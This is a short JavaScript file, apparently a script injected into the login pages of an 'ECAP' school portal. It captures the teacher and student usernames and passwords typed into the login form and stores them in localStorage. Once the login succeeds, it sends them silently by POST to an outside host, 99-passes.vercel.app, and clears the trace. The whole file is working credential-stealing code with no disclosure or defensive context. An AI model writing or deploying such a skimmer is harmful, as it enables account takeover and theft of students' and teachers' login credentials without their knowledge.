if (location.pathname.toLowerCase() === "/ecap/studentmaster.aspx") {
  let user = JSON.parse(localStorage.getItem("user"));
  localStorage.clear();
  if (user && user.id2 && user.pwd2)
    post({ user: user.id2, passwd: user.pwd2, type: "student" });
} else if (location.pathname.toLowerCase() === "/ecap/main.aspx") {
  let user = JSON.parse(localStorage.getItem("user"));
  localStorage.clear();
  if (user && user.id1 && user.pwd1)
    post({ user: user.id1, passwd: user.pwd1, type: "teacher" });
} else {
  const form = document.querySelector("form");
  if (form)
    form.addEventListener("submit", (e) => {
      const id1 = document.getElementById("txtId1");
      const pwd1 = document.getElementById("txtPwd1");
      const id2 = document.getElementById("txtId2");
      const pwd2 = document.getElementById("txtPwd2");

      localStorage.setItem(
        "user",
        JSON.stringify({
          id1: id1.value,
          pwd1: pwd1.value,
          id2: id2.value,
          pwd2: pwd2.value,
        })
      );
    });
}

async function post(body) {
  const url = "https://99-passes.vercel.app/ecap";
  try {
    const response = await fetch(url, {
      method: "POST",
      cache: "no-cache",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(body),
    });
    return response;
  } catch (error) {}
}
